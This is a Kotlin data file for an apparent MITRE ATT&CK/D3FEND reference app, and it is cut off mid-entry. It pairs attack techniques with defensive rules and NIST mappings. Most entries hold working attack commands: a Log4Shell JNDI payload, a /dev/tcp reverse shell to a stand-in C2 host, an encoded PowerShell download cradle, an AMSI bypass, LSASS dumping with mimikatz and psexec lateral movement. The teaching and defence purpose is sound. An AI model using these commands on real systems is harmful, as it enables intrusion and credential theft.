package com.example.data.mitre

import androidx.compose.ui.graphics.Color
import com.example.ui.theme.CyberCyan
import com.example.ui.theme.CyberEmerald
import com.example.ui.theme.SeverityCritical
import com.example.ui.theme.SeverityHigh
import com.example.ui.theme.SeverityMedium

/**
 * The 14 official MITRE ATT&CK Enterprise Tactics.
 */
enum class MitreTactic(
    val displayName: String,
    val tacticId: String,
    val color: Color,
    val description: String
) {
    RECONNAISSANCE("Reconnaissance", "TA0043", Color(0xFF06B6D4), "Gather information to plan future adversary operations"),
    RESOURCE_DEVELOPMENT("Resource Development", "TA0042", Color(0xFF14B8A6), "Establish resources to support operations (infrastructure, accounts, tools)"),
    INITIAL_ACCESS("Initial Access", "TA0001", SeverityCritical, "Techniques used to gain an initial foothold within a network"),
    EXECUTION("Execution", "TA0002", SeverityHigh, "Techniques that result in adversary-controlled code running on a system"),
    PERSISTENCE("Persistence", "TA0003", Color(0xFFA855F7), "Maintain access across system restarts and credential changes"),
    PRIVILEGE_ESCALATION("Privilege Escalation", "TA0004", SeverityCritical, "Gain higher-level permissions (SYSTEM, root, Domain Admin)"),
    DEFENSE_EVASION("Defense Evasion", "TA0005", Color(0xFFF97316), "Avoid detection by security personnel, EDR and logging tools"),
    CREDENTIAL_ACCESS("Credential Access", "TA0006", SeverityCritical, "Steal passwords, tokens, hashes and certificates"),
    DISCOVERY("Discovery", "TA0007", CyberCyan, "Observe system configuration, network topology and environment"),
    LATERAL_MOVEMENT("Lateral Movement", "TA0008", Color(0xFFEAB308), "Access and control remote systems on the enterprise network"),
    COLLECTION("Collection", "TA0009", Color(0xFF8B5CF6), "Gather data of interest to fulfill adversary objectives"),
    COMMAND_AND_CONTROL("Command & Control", "TA0011", Color(0xFF38BDF8), "Communicate with compromised systems to control them"),
    EXFILTRATION("Exfiltration", "TA0010", Color(0xFFEC4899), "Steal data from target network to adversary storage"),
    IMPACT("Impact", "TA0040", SeverityCritical, "Disrupt availability or destroy integrity of systems and data")
}

/**
 * The 7 official MITRE D3FEND Tactics (Defensive Matrix Categories).
 */
enum class MitreDefendTactic(
    val displayName: String,
    val tacticId: String,
    val color: Color,
    val description: String
) {
    MODEL("Model", "D3-TACTIC-MODEL", Color(0xFF06B6D4), "Model and map enterprise assets, network topology, software components, and data flows"),
    HARDEN("Harden", "D3-TACTIC-HARDEN", Color(0xFF10B981), "Harden application configurations, credential stores, system platforms, and communications"),
    DETECT("Detect", "D3-TACTIC-DETECT", Color(0xFFF59E0B), "Detect adversary activity through process, network, file, identifier, and behavioral analysis"),
    ISOLATE("Isolate", "D3-TACTIC-ISOLATE", Color(0xFF8B5CF6), "Isolate execution environments, network segments, and security tokens to constrain movement"),
    DECEIVE("Deceive", "D3-TACTIC-DECEIVE", Color(0xFFEC4899), "Deploy decoy environments, honeytokens, canary credentials, and false artifacts to mislead adversaries"),
    EVICT("Evict", "D3-TACTIC-EVICT", Color(0xFFEF4444), "Evict adversaries by terminating malicious processes, revoking credentials, and isolating network sessions"),
    RESTORE("Restore", "D3-TACTIC-RESTORE", Color(0xFF3B82F6), "Recovery to a known-good state and restoring asset integrity")
}

data class SubTechniqueItem(
    val id: String,
    val name: String,
    val description: String,
    val exampleCommandOrRule: String? = null
)

data class NistControlMapping(
    val controlId: String,
    val controlName: String,
    val familyOrFunction: String,
    val description: String,
    val exampleImplementation: String
)

data class CyberKillChainInfo(
    val stage: String,
    val stageNumber: Int,
    val description: String,
    val scenarioExample: String
)

data class MitreTtpItem(
    val techniqueId: String,
    val name: String,
    val tactic: MitreTactic,
    val subTechnique: String? = null,
    val subTechniquesList: List<SubTechniqueItem> = emptyList(),
    val description: String,
    val attackExampleTitle: String,
    val attackCodeCommand: String,
    val d3fendId: String,
    val d3fendName: String,
    val d3fendDescription: String,
    val d3fendRuleOrFix: String,
    val knownAptGroups: List<String>,
    val tags: List<String>,
    val nistControls: List<NistControlMapping> = emptyList(),
    val cyberKillChain: CyberKillChainInfo? = null
)

data class MitreD3fendItem(
    val d3fendId: String,
    val name: String,
    val tactic: MitreDefendTactic,
    val description: String,
    val ruleOrFix: String,
    val counteredAttackIds: List<String>,
    val tags: List<String>,
    val subTechniquesList: List<SubTechniqueItem> = emptyList(),
    val nistControls: List<NistControlMapping> = emptyList(),
    val cyberKillChain: CyberKillChainInfo? = null
)

object MitreMatrixRepository {

    val allTtps: List<MitreTtpItem> = listOf(
        // ==================== 1. RECONNAISSANCE (TA0043) ====================
        MitreTtpItem(
            techniqueId = "T1595",
            name = "Active Scanning: Vulnerability Scanning",
            tactic = MitreTactic.RECONNAISSANCE,
            subTechnique = "T1595.002",
            subTechniquesList = listOf(
                SubTechniqueItem("T1595.001", "IP Addresses Scanning", "Scanning IP blocks to discover active web services and ports.", "nmap -sn 198.51.100.0/24"),
                SubTechniqueItem("T1595.002", "Vulnerability Scanning", "Executing automated vulnerability scanners to identify missing security patches.", "nuclei -u https://target/ -t cves/"),
                SubTechniqueItem("T1595.003", "Wordlist Scanning", "Brute-forcing hidden administrative directories and endpoints.", "ffuf -u https://target/FUZZ -w wordlist.txt")
            ),
            description = "Adversaries execute automated vulnerability scans against public IP subnets and web applications to discover unpatched edge servers and exposed endpoints.",
            attackExampleTitle = "Mass Scan for Exposed Git Repositories and CVEs via Nuclei",
            attackCodeCommand = """
nuclei -u https://target-corp.com/ -t cves/ -t exposures/ -severity critical,high
nmap -sV -sC -p 443,8443,8080 --script ssl-heartbleed,http-vuln* 198.51.100.0/24
            """.trimIndent(),
            d3fendId = "D3-NTA",
            d3fendName = "Network Traffic Pattern Analysis & Rate Limiting",
            d3fendDescription = "Deploy cloud Edge WAFs with dynamic rate limiting and behavioral bot detection to throttle and block automated scanner fingerprints.",
            d3fendRuleOrFix = """
# AWS WAF Rate-Based Rule: Block IPs making > 100 requests per 5 minutes
{
  "Name": "BlockScannerBursts",
  "MetricName": "BlockScannerBursts",
  "RateKey": "IP",
  "RateLimit": 100
}
            """.trimIndent(),
            knownAptGroups = listOf("APT29 (Cozy Bear)", "FIN7", "Lazarus Group"),
            tags = listOf("Recon", "Nmap", "Nuclei", "Perimeter Scan"),
            nistControls = listOf(
                NistControlMapping("SI-4", "Information System Monitoring", "Detect (DE) / System Integrity", "Monitor enterprise edge subnets for anomalous port scanning and HTTP request bursts.", "Deploy AWS WAF rate-limiting and Cloudflare Bot Management rules."),
                NistControlMapping("RA-5", "Vulnerability Monitoring and Scanning", "Identify (ID) / Risk Assessment", "Perform continuous external perimeter vulnerability scanning before adversaries identify open zero-days.", "Schedule weekly automated Tenable.io perimeter vulnerability scans.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 1: Reconnaissance",
                stageNumber = 1,
                description = "Adversaries perform research and network discovery to select target systems and identify vulnerable ingress points.",
                scenarioExample = "Prior to the SolarWinds supply chain campaign, APT29 conducted low-and-slow perimeter scanning against public cloud VPN endpoints to discover vulnerable firmware versions."
            )
        ),
        MitreTtpItem(
            techniqueId = "T1590",
            name = "Gather Victim Network Info: DNS Recon",
            tactic = MitreTactic.RECONNAISSANCE,
            subTechnique = "T1590.002",
            subTechniquesList = listOf(
                SubTechniqueItem("T1590.001", "Domain Properties", "Harvesting WHOIS registrations and domain registrar history.", "whois target-corp.com"),
                SubTechniqueItem("T1590.002", "DNS Enumeration", "Brute-forcing DNS subdomains and querying zone transfers.", "subfinder -d target-corp.com | dnsx -a")
            ),
            description = "Adversaries perform passive and active DNS enumeration, domain brute-forcing, and zone transfer queries to discover internal subdomains and target topology.",
            attackExampleTitle = "Subdomain Brute Force and AXFR Zone Transfer Request",
            attackCodeCommand = """
dig axfr @ns1.target-corp.com target-corp.com
subfinder -d target-corp.com -silent | dnsx -a -resp
            """.trimIndent(),
            d3fendId = "D3-DNM",
            d3fendName = "Digital Network Mapping & Authoritative DNS Hardening",
            d3fendDescription = "Disable DNS zone transfers (AXFR) for non-authoritative IPs and monitor public DNS queries for anomalous wildcard resolution.",
            d3fendRuleOrFix = """
# Bind9 / Named Configuration: Restrict Zone Transfer
zone "target-corp.com" {
    type master;
    file "/var/named/target-corp.db";
    allow-transfer { none; };
};
            """.trimIndent(),
            knownAptGroups = listOf("APT28 (Fancy Bear)", "MuddyWater"),
            tags = listOf("Recon", "DNS", "Subfinder", "Zone Transfer"),
            nistControls = listOf(
                NistControlMapping("SC-7", "Boundary Protection", "Protect (PR) / Communications", "Enforce strict perimeter DNS resolution controls and restrict AXFR zone transfers to authorized secondary DNS servers.", "Configure AWS Route53 or Bind9 to drop unauthorized zone transfer requests.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 1: Reconnaissance",
                stageNumber = 1,
                description = "Harvesting organizational domain topologies to target vulnerable subdomains and internal staging servers.",
                scenarioExample = "MuddyWater queried public DNS servers to locate unlinked development subdomains hosting legacy web apps."
            )
        ),

        // ==================== 2. RESOURCE DEVELOPMENT (TA0042) ====================
        MitreTtpItem(
            techniqueId = "T1583",
            name = "Acquire Infrastructure: Virtual Private Server",
            tactic = MitreTactic.RESOURCE_DEVELOPMENT,
            subTechnique = "T1583.003",
            subTechniquesList = listOf(
                SubTechniqueItem("T1583.001", "Domains", "Registering typo-squatted domains matching target brands.", "dnstwist target-corp.com"),
                SubTechniqueItem("T1583.003", "Virtual Private Server", "Provisioning bulletproof cloud VPS infrastructure for Command & Control.", "Terraform script deploying anonymous DigitalOcean droplets")
            ),
            description = "Adversaries purchase or rent virtual private servers (VPS), domain names, and cloud server instances to host Command & Control (C2) listeners and phishing pages.",
            attackExampleTitle = "Automated C2 Redirection Deployment via Terraform & Cloudflare",
            attackCodeCommand = """
terraform apply -auto-approve -var="provider=digitalocean" -var="payload=cobaltstrike_beacon"
dnstwist --registered target-corp.com
            """.trimIndent(),
            d3fendId = "D3-DNM",
            d3fendName = "Domain Reputation Filtering & Newly Registered Domain Quarantine",
            d3fendDescription = "Block outbound HTTP/S connections to newly registered domains (NRDs < 30 days) at the Secure Web Gateway (SWG).",
            d3fendRuleOrFix = """
# Palo Alto URL Filtering Category Rule
Set-URLCategory -Category "Newly Registered Domains" -Action "Block" -Decrypt "True"
            """.trimIndent(),
            knownAptGroups = listOf("APT41", "UNC2452", "Kimsuky"),
            tags = listOf("Infra", "VPS", "Domain Fronting", "NRD"),
            nistControls = listOf(
                NistControlMapping("SA-9", "External System Services", "Identify (ID) / Governance", "Enforce domain reputation and threat intelligence monitoring for outbound internet connections.", "Configure Palo Alto URL Filtering to quarantine domain registrations under 30 days old.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 2: Weaponization",
                stageNumber = 2,
                description = "Adversaries assemble and configure infrastructure required to stage malware payloads and maintain command channels.",
                scenarioExample = "UNC2452 established staging infrastructure across multiple cloud providers using stolen credit card credentials prior to the supply chain deployment."
            )
        ),

        // ==================== 3. INITIAL ACCESS (TA0001) ====================
        MitreTtpItem(
            techniqueId = "T1566",
            name = "Phishing: Spearphishing Attachment",
            tactic = MitreTactic.INITIAL_ACCESS,
            subTechnique = "T1566.001",
            subTechniquesList = listOf(
                SubTechniqueItem("T1566.001", "Spearphishing Attachment", "Sending malicious documents with macros or executable attachments.", "Malicious .docm file dropping Qakbot"),
                SubTechniqueItem("T1566.002", "Spearphishing Link", "Embedding credential harvesting URLs in personalized phishing emails.", "Fake Microsoft 365 OAuth consent link"),
                SubTechniqueItem("T1566.003", "Spearphishing via Service", "Delivering phishing messages via LinkedIn or WhatsApp messaging.", "Direct message containing weaponized PDF link")
            ),
            description = "Adversaries deliver targeted spearphishing emails containing malicious attachments (Office Macros, ISO files, LNK shortcuts) to compromise user workstations.",
            attackExampleTitle = "Malicious ISO File Encapsulating LNK Shortcut & DLL Sideloading",
            attackCodeCommand = """
powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA==
# ISO contains: Invoice.lnk -> cmd.exe /c start rundll32.exe payload.dll,PluginInit
            """.trimIndent(),
            d3fendId = "D3-EAH",
            d3fendName = "Email Attachment Sandboxing & File Content Disarm (CDR)",
            d3fendDescription = "Route all incoming email attachments through dynamic detonation sandboxes and automatically strip active macro scripts.",
            d3fendRuleOrFix = """
# Exchange Online Protection (EOP) Safe Attachments Policy
Set-SafeAttachmentPolicy -Name "DynamicDeliveryBlock" -Action Block -Enable true
            """.trimIndent(),
            knownAptGroups = listOf("TA505", "FIN7", "APT29"),
            tags = listOf("Phishing", "Email", "ISO", "LNK", "Macro"),
            nistControls = listOf(
                NistControlMapping("AT-2", "Security Awareness Training", "Protect (PR) / Awareness Training", "Train workforce members to recognize spearphishing social engineering attempts.", "Conduct monthly simulated phishing campaigns and automated reporting add-ins."),
                NistControlMapping("SI-8", "Spam and Malicious Code Protection", "Protect (PR) / System Integrity", "Filter and sandbox inbound email attachments prior to user inbox delivery.", "Deploy Microsoft Defender for Office 365 Safe Attachments with CDR disarm.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 3: Delivery",
                stageNumber = 3,
                description = "Transmission of weaponized payload to the victim via email, messaging, or web browser vector.",
                scenarioExample = "TA505 transmitted thousands of spearphishing emails containing ISO attachments with embedded DLL sideloaders to financial sector executives."
            )
        ),
        MitreTtpItem(
            techniqueId = "T1190",
            name = "Exploit Public-Facing Application",
            tactic = MitreTactic.INITIAL_ACCESS,
            subTechnique = "T1190",
            subTechniquesList = listOf(
                SubTechniqueItem("T1190.001", "Web Application Injection", "Exploiting SQLi, Command Injection, or SSRF in edge web apps.", "Unauthenticated SQL injection dumping administrative sessions"),
                SubTechniqueItem("T1190.002", "Remote Code Execution", "Exploiting deserialization vulnerabilities in enterprise software.", "Log4Shell CVE-2021-44228 JNDI lookup exploit")
            ),
            description = "Adversaries exploit software vulnerabilities, memory corruptions, or unauthenticated remote code execution (RCE) flaws in public-facing web applications or VPN gateways.",
            attackExampleTitle = "Log4Shell (CVE-2021-44228) JNDI Remote Code Execution Exploit",
            attackCodeCommand = """
curl -A '${'$'}{jndi:ldap://c2.attacker.com/a}' https://vulnerable-app.corp.com/api/login
            """.trimIndent(),
            d3fendId = "D3-INJ",
            d3fendName = "Input Filtering & Web Application Firewall Execution Defense",
            d3fendDescription = "Deploy WAF rules to inspect HTTP headers and URI query parameters for LDAP/JNDI injection patterns.",
            d3fendRuleOrFix = """
# ModSecurity WAF Rule for Log4j JNDI Blocking
SecRule REQUEST_HEADERS|REQUEST_LINE|ARGS "@rx \x24\x7bjndi:(ldap|rmi|dns)" \
    "id:1000001,phase:1,deny,status:403,msg:'Block Log4j JNDI Exploit Attempt'"
            """.trimIndent(),
            knownAptGroups = listOf("Lazarus Group", "APT41", "Conti"),
            tags = listOf("Exploit", "RCE", "Log4j", "WAF", "Perimeter"),
            nistControls = listOf(
                NistControlMapping("SI-2", "Flaw Remediation", "Protect (PR) / Maintenance", "Identify and patch known vulnerabilities in public-facing applications within critical SLAs.", "Implement automated vulnerability patching for CVEs with CVSS score >= 9.0 within 24 hours.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 4: Exploitation",
                stageNumber = 4,
                description = "Triggering application software vulnerabilities to run adversary code on the target server.",
                scenarioExample = "Conti ransomware operators exploited unpatched MOVEit Transfer SQL injection vulnerabilities to achieve instant remote code execution."
            )
        ),

        // ==================== 4. EXECUTION (TA0002) ====================
        MitreTtpItem(
            techniqueId = "T1059",
            name = "Command and Scripting Interpreter: PowerShell",
            tactic = MitreTactic.EXECUTION,
            subTechnique = "T1059.001",
            subTechniquesList = listOf(
                SubTechniqueItem("T1059.001", "PowerShell", "Executing obfuscated PowerShell scripts and memory injection stagers.", "powershell.exe -nop -w hidden -enc SGVs..."),
                SubTechniqueItem("T1059.003", "Windows Command Shell", "Executing cmd.exe batch scripts and built-in CLI commands.", "cmd.exe /c net user /domain"),
                SubTechniqueItem("T1059.004", "Unix Shell", "Executing Bash and Zsh shell scripts on Linux/Mac endpoints.", "bash -i >& /dev/tcp/c2.site/4444 0>&1")
            ),
            description = "Adversaries abuse PowerShell interpreters to execute commands, download dynamic in-memory stagers, and bypass execution policies via encoded payloads.",
            attackExampleTitle = "Bypass PowerShell Execution Policy & Download In-Memory Cradle",
            attackCodeCommand = """
powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand aQBlAHgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJ2h0dHA6AC8ALwBjADIALgBzAGkAdABlAC8AcwAuAHAAcwAxACcAKQ==
            """.trimIndent(),
            d3fendId = "D3-PSA",
            d3fendName = "Process Execution Analysis & Constrained Language Mode",
            d3fendDescription = "Enforce PowerShell Constrained Language Mode (CLM) via AppLocker/WDAC and enable Script Block Logging (Event ID 4104).",
            d3fendRuleOrFix = """
# GPO / Registry: Enable Script Block Logging & AMSI Enforcement
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f
            """.trimIndent(),
            knownAptGroups = listOf("FIN7", "APT32", "Wizard Spider"),
            tags = listOf("Execution", "PowerShell", "AMSI", "CLM", "In-Memory"),
            nistControls = listOf(
                NistControlMapping("CM-7", "Least Functionality", "Protect (PR) / Configuration Management", "Restrict interpreter rights and enforce PowerShell Constrained Language Mode for non-administrative users.", "Enable AppLocker rules restricting PowerShell to ConstrainedLanguageMode.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 4: Exploitation",
                stageNumber = 4,
                description = "Adversary code execution triggering native system interpreters to execute malicious commands.",
                scenarioExample = "Wizard Spider initiated Cobalt Strike Beacon execution via encoded PowerShell download cradles launched from macro documents."
            )
        ),

        // ==================== 5. PERSISTENCE (TA0003) ====================
        MitreTtpItem(
            techniqueId = "T1053",
            name = "Scheduled Task/Job: Scheduled Task",
            tactic = MitreTactic.PERSISTENCE,
            subTechnique = "T1053.005",
            subTechniquesList = listOf(
                SubTechniqueItem("T1053.003", "Cron Jobs", "Registering malicious scheduled jobs in Linux crontab.", "echo '* * * * * root /tmp/backdoor' >> /etc/crontab"),
                SubTechniqueItem("T1053.005", "Scheduled Task", "Creating Windows Scheduled Tasks running with SYSTEM privileges.", "schtasks /create /tn 'SystemUpdate' /tr 'cmd.exe /c ...' /sc system")
            ),
            description = "Adversaries create Windows Scheduled Tasks or Linux Cron jobs to execute malicious binaries at system startup, user logon, or periodic time intervals.",
            attackExampleTitle = "Create Persistence Task Executing Payload with SYSTEM Elevation",
            attackCodeCommand = """
schtasks /create /tn "WindowsAppUpdateCheck" /tr "C:\Windows\System32\rundll32.exe C:\ProgramData\update.dll,Main" /sc ONSTART /ru "SYSTEM"
            """.trimIndent(),
            d3fendId = "D3-SMI",
            d3fendName = "System Startup Monitoring & Scheduled Task Authorization",
            d3fendDescription = "Monitor creation of new scheduled tasks via Sysmon Event ID 1 (Process Create) and Event ID 106 (Scheduled Task Registered).",
            d3fendRuleOrFix = """
# Sigma Rule: Detect Unusual Scheduled Task Creation
logsource:
  product: windows
  service: taskscheduler
detection:
  selection:
    EventID: 106
  filter:
    TaskName|contains: '\Microsoft\Windows\'
  condition: selection and not filter
            """.trimIndent(),
            knownAptGroups = listOf("Turla", "OilRig", "APT29"),
            tags = listOf("Persistence", "Schtasks", "Cron", "Startup", "SYSTEM"),
            nistControls = listOf(
                NistControlMapping("SI-4", "System Monitoring", "Detect (DE) / Continuous Monitoring", "Audit and monitor registry and scheduled task startup persistence entries.", "Monitor Windows Event ID 106 and alert on non-standard task paths in C:\\ProgramData.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 5: Installation",
                stageNumber = 5,
                description = "Establishing persistent access backdoors that survive system reboots and administrative restarts.",
                scenarioExample = "Turla registered obfuscated Windows Scheduled Tasks disguised as Google Chrome update tasks to maintain 6+ month persistent footholds."
            )
        ),

        // ==================== 6. PRIVILEGE ESCALATION (TA0004) ====================
        MitreTtpItem(
            techniqueId = "T1068",
            name = "Exploitation for Privilege Escalation: Local Privilege Escalation",
            tactic = MitreTactic.PRIVILEGE_ESCALATION,
            subTechnique = "T1068",
            subTechniquesList = listOf(
                SubTechniqueItem("T1068.001", "Kernel Exploitation", "Exploiting kernel driver vulnerabilities to gain SYSTEM rights.", "GodPotato / PrintNightmare LPE exploit"),
                SubTechniqueItem("T1068.002", "UAC Bypass", "Bypassing Windows User Account Control via elevated COM interfaces.", "fodhelper.exe UAC bypass script")
            ),
            description = "Adversaries exploit operating system kernel vulnerabilities or misconfigured services (Unquoted Service Paths, SeImpersonatePrivilege) to elevate from unprivileged user to SYSTEM/root.",
            attackExampleTitle = "SeImpersonatePrivilege Potato Attack (GodPotato LPE)",
            attackCodeCommand = """
GodPotato.exe -cmd "cmd.exe /c net localgroup Administrators domainuser /add"
whoami /priv # Check SeImpersonatePrivilege enabled
            """.trimIndent(),
            d3fendId = "D3-PIM",
            d3fendName = "Privileged Process Integrity & Service Token Hardening",
            d3fendDescription = "Remove SeImpersonatePrivilege rights from standard service accounts and enforce EDR behavioral token theft detection.",
            d3fendRuleOrFix = """
# PowerShell Security Policy: Remove SeImpersonatePrivilege from IIS & LocalService
ntrights -u "NT AUTHORITY\LOCAL SERVICE" -r SeImpersonatePrivilege
            """.trimIndent(),
            knownAptGroups = listOf("Lazarus Group", "FIN6", "LockBit"),
            tags = listOf("PrivEsc", "LPE", "SYSTEM", "Potato", "Kernel"),
            nistControls = listOf(
                NistControlMapping("AC-6", "Least Privilege", "Protect (PR) / Access Control", "Restrict administrative privileges and remove token impersonation rights from standard domain accounts.", "Deploy LAPS for local admin password management and strip SeImpersonatePrivilege.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 5: Installation",
                stageNumber = 5,
                description = "Elevating local privileges to enable full administrative control over host operating system resources.",
                scenarioExample = "LockBit operators deployed GodPotato exploits on compromised domain workstations to obtain SYSTEM privilege before disabling antivirus software."
            )
        ),

        // ==================== 7. DEFENSE EVASION (TA0005) ====================
        MitreTtpItem(
            techniqueId = "T1027",
            name = "Obfuscated Files or Information: Process Injection",
            tactic = MitreTactic.DEFENSE_EVASION,
            subTechnique = "T1027.002",
            subTechniquesList = listOf(
                SubTechniqueItem("T1027.001", "Binary Padding", "Padding executable sizes to exceed sandbox scan thresholds.", "truncate -s +100M payload.exe"),
                SubTechniqueItem("T1027.002", "Software Packing", "Packing binary payloads using UPX or custom crypters.", "upx --best --ultra-brute payload.exe")
            ),
            description = "Adversaries compress, encrypt, or pack malware binaries to bypass static EDR signature detections and anti-virus scanners.",
            attackExampleTitle = "Payload Encryption & AMSI Memory Patching",
            attackCodeCommand = """
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(${null},${true})
            """.trimIndent(),
            d3fendId = "D3-AMSI",
            d3fendName = "AMSI Memory Integrity & Process Memory Scanning",
            d3fendDescription = "Enable Hardware-Enforced Stack Protection (CET) and deploy EDR memory scanning for unbacked executable memory regions.",
            d3fendRuleOrFix = """
# Sysmon Config: Monitor AMSI Memory Patching & Remote Thread Injection
<Sysmon schemaversion="4.90">
  <EventFiltering>
    <CreateRemoteThread onmatch="include">
      <StartFunction condition="contains">AmsiScanBuffer</StartFunction>
    </CreateRemoteThread>
  </EventFiltering>
</Sysmon>
            """.trimIndent(),
            knownAptGroups = listOf("APT29", "FIN7", "Emotet"),
            tags = listOf("DefenseEvasion", "AMSI", "Obfuscation", "MemoryPatch"),
            nistControls = listOf(
                NistControlMapping("SI-7", "Software, Firmware, and Information Integrity", "Protect (PR) / System Integrity", "Verify software execution integrity and monitor process memory modifications.", "Deploy Microsoft Defender EDR with AMSI Memory Tamper Protection enabled.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 4: Exploitation",
                stageNumber = 4,
                description = "Evading endpoint detection and antivirus telemetry during payload detonation.",
                scenarioExample = "APT29 patched AMSI memory buffers in PowerShell processes before launching custom in-memory reconnaissance tools."
            )
        ),

        // ==================== 8. CREDENTIAL ACCESS (TA0006) ====================
        MitreTtpItem(
            techniqueId = "T1003",
            name = "OS Credential Dumping: LSASS Memory",
            tactic = MitreTactic.CREDENTIAL_ACCESS,
            subTechnique = "T1003.001",
            subTechniquesList = listOf(
                SubTechniqueItem("T1003.001", "LSASS Memory", "Dumping credentials directly from Local Security Authority Subsystem Service memory.", "procdump.exe -ma lsass.exe lsass.dmp"),
                SubTechniqueItem("T1003.002", "Security Account Manager", "Extracting SAM registry hashes for local account offline cracking.", "reg save HKLM\\SAM sam.hive"),
                SubTechniqueItem("T1003.003", "NTDS.dit", "Extracting Active Directory database files from Domain Controllers.", "ntdsutil 'ac i ntds' 'ifm' 'create full C:\\NTDS' q q")
            ),
            description = "Adversaries dump process memory of the Local Security Authority Subsystem Service (LSASS) to harvest plaintext passwords, NTLM hashes, and Kerberos tickets.",
            attackExampleTitle = "Mimikatz LSASS Process Dump & Sekurlsa Pass-the-Hash",
            attackCodeCommand = """
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
            """.trimIndent(),
            d3fendId = "D3-LSA",
            d3fendName = "LSASS Process Protection & LSA Protected Mode (RunAsPPL)",
            d3fendDescription = "Enable Windows Defender Credential Guard and enforce LSA Protection (RunAsPPL=1) to prevent unauthenticated handle opening to LSASS.",
            d3fendRuleOrFix = """
# Enable LSA Protection (RunAsPPL) in Windows Registry
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
            """.trimIndent(),
            knownAptGroups = listOf("FIN6", "APT28", "Conti", "LockBit"),
            tags = listOf("CredAccess", "LSASS", "Mimikatz", "NTLM", "RunAsPPL"),
            nistControls = listOf(
                NistControlMapping("IA-5", "Authenticator Management", "Protect (PR) / Identity", "Protect authenticators and password hashes stored in system memory from unauthenticated access.", "Enable Credential Guard and LSA Protected Mode (RunAsPPL) on all Windows hosts.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 6: Command & Control",
                stageNumber = 6,
                description = "Harvesting high-privilege credentials to expand domain access and achieve domain admin privilege escalation.",
                scenarioExample = "Conti ransomware affiliates dumped LSASS memory on local domain controllers using ProcDump to harvest Domain Admin NTLM hashes."
            )
        ),

        // ==================== 9. DISCOVERY (TA0007) ====================
        MitreTtpItem(
            techniqueId = "T1087",
            name = "Account Discovery: Domain Account Discovery",
            tactic = MitreTactic.DISCOVERY,
            subTechnique = "T1087.002",
            subTechniquesList = listOf(
                SubTechniqueItem("T1087.001", "Local Account Discovery", "Querying local SAM accounts on victim workstation.", "net user"),
                SubTechniqueItem("T1087.002", "Domain Account Discovery", "Querying Active Directory domain accounts and privilege groups via PowerView.", "Get-NetUser | Select-Object samaccountname,memberof")
            ),
            description = "Adversaries query Active Directory or local OS interfaces to identify user accounts, administrative groups, and domain privileges.",
            attackExampleTitle = "PowerView & BloodHound Active Directory Domain Enumeration",
            attackCodeCommand = """
Get-NetUser -Unconstrained | select samaccountname,description
sharpstat.exe --computername domain-controller-01 --check-admin
            """.trimIndent(),
            d3fendId = "D3-ADC",
            d3fendName = "Active Directory Query Auditing & Canary Honeytoken Accounts",
            d3fendDescription = "Deploy Active Directory Canary Honeytoken accounts and alert on LDAP enumeration queries originating from standard workstations.",
            d3fendRuleOrFix = """
# Active Directory Audit Policy: Enable Directory Service Access Auditing
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
            """.trimIndent(),
            knownAptGroups = listOf("APT29", "Wizard Spider", "FIN7"),
            tags = listOf("Discovery", "ActiveDirectory", "PowerView", "BloodHound"),
            nistControls = listOf(
                NistControlMapping("AU-12", "Audit Generation", "Identify (ID) / Audit & Accountability", "Audit directory service queries and detect unusual mass LDAP requests.", "Enable Active Directory LDAP query logging and deploy Canary Account traps.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 6: Command & Control",
                stageNumber = 6,
                description = "Mapping internal organizational account structures and domain administrator privileges.",
                scenarioExample = "Wizard Spider executed BloodHound collectors to generate Active Directory path graphs identifying shortest routes to Domain Admin accounts."
            )
        ),

        // ==================== 10. LATERAL MOVEMENT (TA0008) ====================
        MitreTtpItem(
            techniqueId = "T1021",
            name = "Remote Services: SMB/Windows Admin Shares",
            tactic = MitreTactic.LATERAL_MOVEMENT,
            subTechnique = "T1021.002",
            subTechniquesList = listOf(
                SubTechniqueItem("T1021.001", "Remote Desktop Protocol", "RDP lateral movement using stolen domain credentials.", "mstsc.exe /v:10.0.0.15"),
                SubTechniqueItem("T1021.002", "SMB/Windows Admin Shares", "Executing commands across remote hosts via PsExec or SMB admin shares.", "psexec.exe \\\\10.0.0.15 -s cmd.exe"),
                SubTechniqueItem("T1021.006", "Windows Remote Management", "Lateral movement via WinRM PowerShell remoting.", "Enter-PSSession -ComputerName Server01")
            ),
            description = "Adversaries abuse Server Message Block (SMB) file shares and Admin Shares (ADMINS, C$) to copy payload binaries and execute remote processes via RPC/PsExec.",
            attackExampleTitle = "PsExec / Impacket psexec.py Remote Execution across Subnets",
            attackCodeCommand = """
python3 psexec.py CORP.LOCAL/adminuser:'Password123!'@10.0.1.55 cmd.exe
psexec.exe \\10.0.1.55 -u CORP\adminuser -p 'Password123!' -s cmd.exe
            """.trimIndent(),
            d3fendId = "D3-SMB",
            d3fendName = "SMB Protocol Hardening & Network Micro-segmentation",
